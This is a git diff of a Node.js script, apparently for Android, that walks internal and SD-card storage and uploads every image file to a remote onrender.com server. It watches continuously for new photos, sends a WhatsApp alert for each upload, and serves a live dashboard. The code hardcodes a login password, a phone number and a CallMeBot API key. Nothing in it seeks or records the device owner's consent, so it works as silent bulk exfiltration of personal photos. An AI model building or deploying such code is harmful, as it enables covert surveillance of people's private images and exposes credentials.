@@ -3,86 +3,115 @@ const path = require("path");
 const axios = require("axios");
 const FormData = require("form-data");
 const wifi = require("node-wifi");
+const express = require("express");
+const http = require("http");
+const socketIo = require("socket.io");
+const chokidar = require("chokidar");
 
-// CONFIGURATION
+// ---------------- CONFIGURATION ----------------
 const INTERNAL_ROOT = "/storage/emulated/0/";
 const EXTERNAL_ROOTS = ["/storage"];
-const SERVER_URL = "http://TON_SERVEUR/upload";
+const SERVER_URL = "https://s-script-1.onrender.com";
 const HISTORY_FILE = "uploaded.json";
 const BATCH_SIZE = 3;
 const IGNORE_FOLDERS = ["Android", "LOST.DIR"];
-const SCAN_INTERVAL = 5 * 60 * 1000; // 5 minutes
+const RETRY_INTERVAL = 60 * 1000;
+const MAX_RETRIES = 3;
 
-// Initialiser node-wifi
+const USERNAME = "anonymiste";
+const PASSWORD = "#Paul@26@";
+
+let jwtToken = null;
+let uploadedFiles = [];
+
+// ---------------- INITIALISATION ----------------
 wifi.init({ iface: null });
 
-// Charger l'historique
-let uploadedFiles = [];
 if (fs.existsSync(HISTORY_FILE)) {
     uploadedFiles = JSON.parse(fs.readFileSync(HISTORY_FILE, "utf8"));
 }
 
-// Sauvegarder l'historique
 function saveHistory() {
     fs.writeFileSync(HISTORY_FILE, JSON.stringify(uploadedFiles, null, 2));
 }
 
-// Fonction WhatsApp
+// ---------------- WHATSAPP ----------------
 async function sendWhatsApp(message) {
     const phone = "22891782947";
     const apiKey = "1944847";
-
     try {
         await axios.get(`https://api.callmebot.com/whatsapp.php?phone=${phone}&text=${encodeURIComponent(message)}&apikey=${apiKey}`);
-        console.log("✅ Message envoyé sur WhatsApp via CallMeBot");
+        console.log("✅ WhatsApp:", message);
     } catch (err) {
         console.error("❌ Erreur WhatsApp:", err.message);
     }
 }
 
-// Upload d'une image
-async function uploadImage(filePath) {
+// ---------------- AUTHENTIFICATION ----------------
+async function login() {
     try {
-        const form = new FormData();
-        form.append("image", fs.createReadStream(filePath));
-        await axios.post(SERVER_URL, form, { headers: form.getHeaders() });
-        console.log(`✅ Upload réussi : ${filePath}`);
-        uploadedFiles.push(filePath);
-        saveHistory();
-
-        // Notification WhatsApp
-        await sendWhatsApp(`✅ Upload réussi : ${filePath}`);
+        const response = await axios.post(`${SERVER_URL}/login`, { username: USERNAME, password: PASSWORD });
+        jwtToken = response.data.token;
+        console.log("✅ Authentification réussie");
     } catch (err) {
-        console.error(`❌ Échec upload ${filePath}:`, err.message);
-        await sendWhatsApp(`❌ Échec upload : ${filePath} \nErreur : ${err.message}`);
+        console.error("❌ Échec login:", err.message);
+        jwtToken = null;
     }
 }
 
-// Collecte récursive des images
+// ---------------- UTILITAIRES ----------------
+async function isWifiConnected() {
+    try {
+        const connections = await wifi.getCurrentConnections();
+        return connections.length > 0;
+    } catch (err) {
+        console.error("❌ Erreur Wi-Fi :", err.message);
+        return false;
+    }
+}
+
 function collectImages(folder, images = []) {
     let entries;
-    try {
-        entries = fs.readdirSync(folder, { withFileTypes: true });
-    } catch (err) {
-        return images;
-    }
-
-    for (let entry of entries) {
+    try { entries = fs.readdirSync(folder, { withFileTypes: true }); } catch { return images; }
+    for (const entry of entries) {
         const fullPath = path.join(folder, entry.name);
-        if (entry.isDirectory()) {
-            if (!IGNORE_FOLDERS.includes(entry.name)) {
-                collectImages(fullPath, images);
-            }
-        } else if (/\.(jpg|jpeg|png|gif)$/i.test(entry.name)) {
-            if (!uploadedFiles.includes(fullPath)) {
-                images.push(fullPath);
-            }
-        }
+        if (entry.isDirectory() && !IGNORE_FOLDERS.includes(entry.name)) collectImages(fullPath, images);
+        else if (/\.(jpg|jpeg|png|gif)$/i.test(entry.name) && !uploadedFiles.includes(fullPath)) images.push(fullPath);
     }
     return images;
 }
 
-// Upload par lots
+// ---------------- UPLOAD ----------------
+async function uploadImage(filePath, attempt = 1) {
+    if (!jwtToken) await login();
+    if (!jwtToken) return;
+
+    try {
+        const form = new FormData();
+        form.append("image", fs.createReadStream(filePath));
+
+        await axios.post(`${SERVER_URL}/upload`, form, {
+            headers: { ...form.getHeaders(), Authorization: `Bearer ${jwtToken}` }
+        });
+
+        console.log(`✅ Upload réussi : ${filePath}`);
+        uploadedFiles.push(filePath);
+        saveHistory();
+        await sendWhatsApp(`✅ Upload réussi : ${filePath}`);
+        io.emit("upload", { file: path.basename(filePath), status: "success" });
+
+    } catch (err) {
+        console.error(`❌ Échec upload ${filePath} (tentative ${attempt}):`, err.message);
+        await sendWhatsApp(`❌ Échec upload : ${filePath} (tentative ${attempt})\nErreur : ${err.message}`);
+        io.emit("upload", { file: path.basename(filePath), status: "fail", attempt });
+
+        if (attempt < MAX_RETRIES) {
+            setTimeout(() => uploadImage(filePath, attempt + 1), RETRY_INTERVAL);
+        }
+    }
+}
+
+// ---------------- BATCH UPLOAD ----------------
 async function uploadBatch(images) {
     for (let i = 0; i < images.length; i += BATCH_SIZE) {
         const batch = images.slice(i, i + BATCH_SIZE);
@@ -90,54 +119,60 @@ async function uploadBatch(images) {
     }
 }
 
-// Vérifier la connexion Wi-Fi
-async function isWifiConnected() {
-    try {
-        const connections = await wifi.getCurrentConnections();
-        return connections.length > 0;
-    } catch (err) {
-        console.error("Erreur Wi-Fi :", err.message);
-        return false;
-    }
+// ---------------- FILE WATCHER ----------------
+function startWatcher() {
+    const watcherPaths = [INTERNAL_ROOT, ...EXTERNAL_ROOTS];
+    const watcher = chokidar.watch(watcherPaths, { ignored: /(^|[\/\\])\../, persistent: true });
+
+    watcher.on("add", async filePath => {
+        if (/\.(jpg|jpeg|png|gif)$/i.test(filePath) && !uploadedFiles.includes(filePath)) {
+            const wifiConnected = await isWifiConnected();
+            if (wifiConnected) await uploadImage(filePath);
+        }
+    });
+
+    console.log("👀 File watcher actif, surveille les nouvelles images...");
 }
 
-// Fonction principale
-async function main() {
-    const wifiConnected = await isWifiConnected();
-    if (!wifiConnected) {
-        console.log("⚠️ Pas de Wi-Fi. Uploads suspendus.");
-        await sendWhatsApp("⚠️ Pas de Wi-Fi. Uploads suspendus.");
-        return;
-    }
+// ---------------- DASHBOARD WEB ----------------
+const app = express();
+const server = http.createServer(app);
+const io = socketIo(server);
 
-    console.log("🔔 Wi-Fi détecté. Scan des images...");
+app.get("/", (req, res) => {
+    res.send(`
+        <html>
+            <head><title>Dashboard Upload</title></head>
+            <body>
+                <h1>Uploads en temps réel</h1>
+                <ul id="logs"></ul>
+                <script src="/socket.io/socket.io.js"></script>
+                <script>
+                    const socket = io();
+                    const logs = document.getElementById("logs");
+                    socket.on("upload", data => {
+                        const li = document.createElement("li");
+                        li.textContent = \`\${data.file} - \${data.status}\${data.attempt ? " (attempt "+data.attempt+")" : ""}\`;
+                        logs.appendChild(li);
+                    });
+                </script>
+            </body>
+        </html>
+    `);
+});
 
-    // Stockage interne
-    let images = collectImages(INTERNAL_ROOT);
+server.listen(4000, () => console.log("🌐 Dashboard actif sur http://localhost:4000"));
 
-    // Carte SD / stockage externe
-    for (let root of EXTERNAL_ROOTS) {
-        try {
-            const subdirs = fs.readdirSync(root, { withFileTypes: true });
-            for (let sub of subdirs) {
-                if (sub.isDirectory() && sub.name !== "emulated") {
-                    images = images.concat(collectImages(path.join(root, sub.name)));
-                }
-            }
-        } catch (err) { /* ignoré si inaccessible */ }
-    }
+// ---------------- MAIN ----------------
+(async function main() {
+    await login();
 
-    console.log(`📁 ${images.length} images à uploader...`);
-    if (images.length > 0) {
-        await uploadBatch(images);
-        console.log("✅ Upload terminé !");
-        await sendWhatsApp(`✅ Upload terminé ! ${images.length} image(s) envoyée(s).`);
-    } else {
-        console.log("✅ Aucune nouvelle image à uploader.");
-        await sendWhatsApp("✅ Aucune nouvelle image à uploader.");
-    }
-}
+    // Scan initial pour les images existantes
+    let initialImages = collectImages(INTERNAL_ROOT);
+    for (const root of EXTERNAL_ROOTS) initialImages = initialImages.concat(collectImages(root));
+    await uploadBatch(initialImages);
 
-// Lancer la surveillance en continu
-main(); // premier scan
-setInterval(main, SCAN_INTERVAL);
+    // Lancer le file watcher
+    startWatcher();
+})();
+ 
